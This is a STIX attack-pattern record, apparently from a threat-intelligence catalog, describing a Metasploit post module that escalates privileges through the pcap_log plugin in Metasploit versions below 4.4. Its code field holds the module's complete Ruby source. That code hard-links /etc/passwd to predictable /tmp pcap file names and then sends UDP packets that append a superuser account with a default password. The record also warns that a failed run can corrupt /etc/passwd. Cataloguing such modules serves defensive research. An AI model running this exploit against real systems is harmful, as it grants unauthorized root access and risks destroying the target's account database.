{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95b29d6b-4e94-41ab-95a6-42cdd5250a65",
    "created": "2024-08-14T16:33:17.992859Z",
    "modified": "2024-08-14T16:33:17.992863Z",
    "name": "Multi Escalate Metasploit pcap_log Local Privilege Escalation",
    "description": " Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these filenames to /etc/passwd, then sending a packet with a privileged user entry contained within. This, and all the other packets, are appended to /etc/passwd.  Successful exploitation results in the creation of a new superuser account.  This module requires manual clean-up. Upon success, you should remove /tmp/msf3-session*pcap files and truncate /etc/passwd. Note that if this module fails, you can potentially induce a permanent DoS on the target by corrupting the /etc/passwd file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/escalate/metasploit_pcaplog.rb",
            "external_id": "metasploit_pcaplog.rb"
        },
        {
            "source_name": "reference",
            "url": "http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html"
        },
        {
            "source_name": "reference",
            "url": "https://community.rapid7.com/docs/DOC-1946"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  Rank = ManualRanking\n\n  include Msf::Post::File\n\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name'\t=> 'Multi Escalate Metasploit pcap_log Local Privilege Escalation',\n          'Description' => %q{\n            Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings,\n            creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these\n            filenames to /etc/passwd, then sending a packet with a privileged user entry contained within.\n            This, and all the other packets, are appended to /etc/passwd.\n\n            Successful exploitation results in the creation of a new superuser account.\n\n            This module requires manual clean-up. Upon success, you should remove /tmp/msf3-session*pcap\n            files and truncate /etc/passwd. Note that if this module fails, you can potentially induce\n            a permanent DoS on the target by corrupting the /etc/passwd file.\n          },\n          'License' => MSF_LICENSE,\n          'Author'\t=> [ '0a29406d9794e4f9b30b3c5d6702c708'],\n          'Platform' => %w[bsd linux unix],\n          'SessionTypes' => [ 'shell', 'meterpreter' ],\n          'References' => [\n            [ 'BID', '54472' ],\n            [ 'URL', 'http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html'],\n            [ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ],\n          ],\n          'DisclosureDate' => '2012-07-16',\n          'Stance' => Msf::Exploit::Stance::Passive\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(2940),\n        OptString.new('USERNAME', [ true, 'Username for the new superuser', 'metasploit' ]),\n        OptString.new('PASSWORD', [ true, 'Password for the new superuser', 'metasploit' ]),\n        OptInt.new('MINUTES', [true, 'Number of minutes to try to inject', 5])\n      ], self\n    )\n  end\n\n  def normalize_minutes\n    datastore['MINUTES'].abs\n  rescue StandardError\n    0\n  end\n\n  def run\n    print_status \"Setting up the victim's /tmp dir\"\n    fail_with(Failure::NotFound, '/etc/passwd not found on system') unless file_exist?('/etc/passwd')\n    initial_size = read_file('/etc/passwd').lines.count\n    print_status \"/etc/passwd is currently #{initial_size} lines long\"\n    i = 0\n    j = 0\n    loop do\n      if (i == 0)\n        j += 1\n        break if j >= datastore['MINUTES'] + 1 # Give up after X minutes\n\n        # 0a2940: cmd_exec is slow, so send 1 command to do all the links\n        print_status \"Linking /etc/passwd to predictable tmp files (Attempt #{j})\"\n        cmd_exec(\"for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\\\"\\$i seconds\\\" +%Y-%m-%d_%H-%M-%S`.pcap ; done\")\n      end\n      current_size = read_file('/etc/passwd').lines.count\n      if current_size == initial_size\n        # PCAP is flowing\n        pkt = \"\\n\\n\" + datastore['USERNAME'] + ':' + datastore['PASSWORD'].crypt('0a') + \":0:0:Metasploit Root Account:/tmp:/bin/bash\\n\\n\"\n        vprint_status(\"Sending /etc/passwd file contents payload to #{session.session_host}\")\n        udpsock = Rex::Socket::Udp.create(\n          {\n            'Context' => { 'Msf' => framework, 'MsfExploit' => self }\n          }\n        )\n        res = udpsock.sendto(pkt, session.session_host, datastore['RPORT'])\n      else\n        break\n      end\n      sleep(1) # wait a second\n      i = (i + 1) % 60 # increment second counter\n    end\n\n    if read_file('/etc/passwd').includes?('Metasploit')\n      print_good(\"Success. You should now be able to login or su to the '\" + datastore['USERNAME'] + \"' account\")\n      # TODO: Consider recording our now-created username and password as a valid credential here.\n    else\n      print_error(\"Failed, the '\" + datastore['USERNAME'] + \"' user does not appear to have been added\")\n    end\n    # 0a2940: Initially the plan was to have this post module switch user, upload & execute a new payload\n    #\t  However beceause the session is not a terminal, su will not always allow this.\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-16",
    "x_mitre_platforms": [
        "%w[bsd linux unix]"
    ]
}